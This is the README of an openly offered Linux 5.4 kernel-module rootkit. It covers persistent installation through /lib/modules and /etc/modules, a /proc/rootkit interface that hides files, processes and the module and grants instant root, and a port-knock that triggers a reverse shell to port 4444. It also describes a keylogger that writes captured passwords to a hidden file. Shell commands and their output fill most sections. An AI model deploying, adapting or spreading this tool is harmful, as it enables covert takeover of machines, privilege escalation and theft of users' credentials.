
# RKUltra

> A full-featured Linux 5.4 LKM Rootkit (Tested on Ubuntu 20.04)

# Dependencies

In order to build, the following packages are required:

- build-essential
- linux-headers

`sudo apt install build-essential linux-headers-$(uname -r)`

Alternatively, a Vagrantfile is provided for Ubuntu 20.04 with dependencies installed [here](Vagrantfile).

# Installation and Use

An installer script has been provided to help you get up and running, to use simply run the following

```bash
sudo ./installer.sh install
```

This will make and install the rootkit persistently, by dropping the compiled `.ko` into a folder in `/lib/modules/` and adding it to `/etc/modules`

From here, the rootkit is now active. By default it is interfacable via a procfile located in `/proc/rootkit` and hidden from the user

# Features

## Toggle hiding

In order to toggle all file/folder/process/module hiding, you can write `toggle` to the procfile interface

```bash
$ lsmod | grep rootkit
$ echo toggle > /proc/rootkit 
$ lsmod | grep rootkit
rootkit                24576  0
```

## Elevate permissions

For any process to elevate to running with root permissions, all it has to do is write `root` into the procfile

```bash
$ id
uid=1000(vagrant) gid=1000(vagrant) groups=1000(vagrant)
$ echo root > /proc/rootkit
$ id
uid=0(root) gid=0(root) groups=0(root)
```

## Hide a process

Writing `hide<PID>` to the procfile will hide that process and it's children from all other processes on the system, while it will remain visible to you.

Process 1
```bash
$ echo $$
86711
$ echo hide$$ > /proc/rootkit
$ ps aux | grep $$ # Process remains visible to self
vagrant    86711  0.0  0.0   9836  4232 pts/0    Ss   14:09   0:00 /bin/bash
```
Process 2
```bash
$ ps aux | grep 86711 # Process cannot be seen by others
$ echo toggle > /proc/rootkit  
$ ps aux | grep 86711 # Can be seen when hiding is disabled
vagrant    86711  0.0  0.0   9836  4232 pts/0    Ss+  14:09   0:00 /bin/bash
```

The opposite can be done using `unhide`

## Remote access

In order to trigger a reverse shell, you can knock on a series of ports: [5295, 9257, 7369]. Upon doing this, a reverse shell to your IP on port 4444 will be opened.

Listen for connection
```bash
$ nc -lvnp 4444
Ncat: Version 7.91 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 192.168.99.10.
Ncat: Connection from 192.168.99.10:49748.
root@vagrant:/#
```
Knock ports example
```bash
$ knock 192.168.99.10 5295
$ knock 192.168.99.10 9257
$ knock 192.168.99.10 7369
```

## Keystroke Logging

All keystrokes are logged to a file in `/usr/rk_file_keylog` - the file in as such because any file with the prefix `rk_file_` will be hidden from directory listing.

```bash
$ sudo tail -f /usr/rk_file_keylog
Starting keylogger
test_user
PaSsWoRd
<CTRL>c
<CTRL>z
<CAPSLOCK>AAAAAAA
<CAPSLOCK>calm
```
# Removal
The following will unhide the module and remove it from the system
```bash
sudo ./installer.sh remove
```
